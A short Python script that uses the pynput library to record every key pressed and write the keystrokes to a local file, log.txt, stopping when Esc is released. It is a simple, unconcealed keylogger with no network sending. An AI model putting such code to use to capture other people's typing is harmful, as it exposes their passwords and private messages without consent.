from pynput import keyboard, mouse
keys = []
def perkey(key):
    keys.append(key)
    reset_file(keys)

def reset_file(keys):
    with open('log.txt', 'w') as file:
        for key in keys:
            file.write(str(key))

def each_key_release(key):
    if key == keyboard.Key.esc:
        return False
    
with keyboard.Listener(
    on_press = perkey,
    on_release = each_key_release
) as lis:
    lis.join()